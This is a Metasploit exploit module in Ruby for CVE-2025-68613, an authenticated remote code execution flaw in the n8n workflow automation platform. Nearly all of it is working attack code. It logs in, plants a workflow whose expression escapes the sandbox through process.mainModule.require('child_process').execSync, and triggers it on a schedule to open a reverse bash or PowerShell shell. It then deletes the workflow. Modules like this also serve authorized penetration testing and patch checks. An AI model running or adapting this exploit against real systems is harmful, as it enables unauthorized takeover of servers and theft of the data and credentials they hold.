##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'n8n Workflow Expression Remote Code Execution',
        'Description' => %q{
          This module exploits a critical remote code execution vulnerability (CVE-2025-68613)
          in n8n workflow automation platform. The vulnerability exists in the workflow
          expression evaluation system where user-supplied expressions enclosed in {{ }}
          are evaluated in an execution context that is not sufficiently isolated from the
          underlying Node.js runtime.

          An authenticated attacker can create a workflow containing malicious expressions
          that access the Node.js process object via this.process.mainModule.require to load
          child_process and execute arbitrary system commands. The exploit uses a Schedule
          Trigger node that automatically fires and evaluates the malicious expression.

          Successful exploitation may lead to full compromise of the n8n instance,
          including unauthorized access to sensitive data, modification of workflows,
          and execution of system-level operations.

          Affected versions: >= 0.211.0 and < 1.120.4, < 1.121.1, < 1.122.0
        },
        'Author' => [
          'Lukas Johannes MÃ¶ller'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-68613'],
          ['URL', 'https://github.com/n8n-io/n8n/security/advisories'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2025-68613']
        ],
        'Platform' => %w[unix linux win],
        'Arch' => [ARCH_CMD],
        'Payload' => {
          'BadChars' => "\x00\x0a\x0d\x22\x27\x5c"
        },
        'Targets' => [
          [
            'Unix/Linux Command',
            {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ]
        ],
        'Privileged' => false,
        'DisclosureDate' => '2025-06-10',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 5678,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path to n8n', '/']),
        OptString.new('USERNAME', [true, 'n8n username or email for authentication']),
        OptString.new('PASSWORD', [true, 'n8n password for authentication'])
      ]
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'rest', 'settings')
    )

    return CheckCode::Unknown('Could not connect to n8n') unless res

    # Try to get version from various endpoints
    version = nil

    if res.code == 200
      json = res.get_json_document
      version = json['versionCli'] if json.is_a?(Hash)
    end

    # Also check healthz endpoint which may reveal version
    if version.nil?
      send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'healthz')
      )
      # Some installations expose version in headers or body
    end

    return CheckCode::Detected('n8n detected but could not determine version') if version.nil?

    print_status("Detected n8n version: #{version}")

    begin
      ver = Rex::Version.new(version)
    rescue ArgumentError
      return CheckCode::Detected("n8n detected, version parsing failed: #{version}")
    end

    # Vulnerable versions: >= 0.211.0 and < 1.120.4 or < 1.121.1 or < 1.122.0
    if ver >= Rex::Version.new('0.211.0')
      if ver < Rex::Version.new('1.120.4')
        return CheckCode::Appears("Version #{version} is vulnerable (< 1.120.4)")
      elsif ver >= Rex::Version.new('1.121.0') && ver < Rex::Version.new('1.121.1')
        return CheckCode::Appears("Version #{version} is vulnerable (1.121.0)")
      elsif ver >= Rex::Version.new('1.122.0') && ver < Rex::Version.new('1.122.0')
        # This condition won't ever be true, 1.122.0 is patched
        return CheckCode::Appears("Version #{version} is vulnerable")
      end
    end

    CheckCode::Safe("Version #{version} is not vulnerable")
  end

  def authenticate
    print_status('Attempting to authenticate...')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'login'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => {
        'emailOrLdapLoginId' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }.to_json
    )

    if res&.code == 200
      json = res.get_json_document
      if json.is_a?(Hash) && json['data']
        print_good('Successfully authenticated')
        return true
      end
    end

    # Try alternate login format
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'login'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => {
        'email' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }.to_json
    )

    if res&.code == 200
      json = res.get_json_document
      if json.is_a?(Hash) && (json['data'] || json['success'])
        print_good('Successfully authenticated')
        return true
      end
    end

    fail_with(Failure::NoAccess, 'Authentication failed')
  end

  def create_malicious_workflow(cmd)
    # CVE-2025-68613 Expression Sandbox Escape Payload
    # Uses this.process.mainModule.require to access child_process directly
    # The expression {{ }} evaluates JavaScript in n8n's expression context
    escaped_cmd = cmd.gsub("'", "\\\\'")

    # Working payload: this.process.mainModule.require('child_process').execSync()
    expression_payload = "={{ (function(){ return this.process.mainModule.require('child_process')" \
                         ".execSync('#{escaped_cmd}').toString() })() }}"

    workflow_name = "workflow_#{Rex::Text.rand_text_alphanumeric(8)}"

    workflow_data = {
      'name' => workflow_name,
      'active' => false,
      'settings' => {
        'saveDataErrorExecution' => 'all',
        'saveDataSuccessExecution' => 'all',
        'saveManualExecutions' => true,
        'executionOrder' => 'v1'
      },
      'nodes' => [
        {
          'parameters' => {
            'rule' => {
              'interval' => [{ 'field' => 'seconds', 'secondsInterval' => 3 }]
            }
          },
          'id' => Rex::Text.rand_text_alphanumeric(36),
          'name' => 'Schedule Trigger',
          'type' => 'n8n-nodes-base.scheduleTrigger',
          'typeVersion' => 1.1,
          'position' => [250, 300]
        },
        {
          'parameters' => {
            'values' => {
              'string' => [
                {
                  'name' => 'result',
                  'value' => expression_payload
                }
              ]
            }
          },
          'id' => Rex::Text.rand_text_alphanumeric(36),
          'name' => 'Set',
          'type' => 'n8n-nodes-base.set',
          'typeVersion' => 1,
          'position' => [450, 300]
        }
      ],
      'connections' => {
        'Schedule Trigger' => {
          'main' => [
            [
              {
                'node' => 'Set',
                'type' => 'main',
                'index' => 0
              }
            ]
          ]
        }
      }
    }

    print_status('Creating malicious workflow...')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => workflow_data.to_json
    )

    unless res&.code == 200 || res&.code == 201
      fail_with(Failure::UnexpectedReply, "Failed to create workflow: #{res&.code}")
    end

    json = res.get_json_document
    workflow_id = json.dig('data', 'id') || json['id']

    unless workflow_id
      fail_with(Failure::UnexpectedReply, 'Failed to get workflow ID from response')
    end

    print_good("Created workflow with ID: #{workflow_id}")
    @workflow_id = workflow_id
    workflow_id
  end

  def execute_workflow(workflow_id)
    print_status("Activating workflow #{workflow_id} to trigger scheduled execution...")

    # Activate the workflow via PATCH - the Schedule Trigger will fire automatically
    res = send_request_cgi(
      'method' => 'PATCH',
      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', workflow_id.to_s),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => { 'active' => true }.to_json
    )

    if res&.code == 200
      print_good('Workflow activated - payload will execute via Schedule Trigger')
      print_status('Waiting for scheduled execution (3-5 seconds)...')
      Rex.sleep(5)
    else
      print_error("Failed to activate workflow: #{res&.code}")
    end
  end

  def delete_workflow(workflow_id)
    print_status("Cleaning up workflow #{workflow_id}...")

    send_request_cgi(
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', workflow_id.to_s),
      'keep_cookies' => true
    )
  end

  def exploit
    authenticate

    workflow_id = create_malicious_workflow(payload.encoded)
    execute_workflow(workflow_id)
  end

  def cleanup
    super
    return unless @workflow_id

    begin
      delete_workflow(@workflow_id)
      print_good('Workflow cleaned up successfully')
    rescue StandardError => e
      print_warning("Failed to clean up workflow: #{e.message}")
    end

    @workflow_id = nil
  end
end
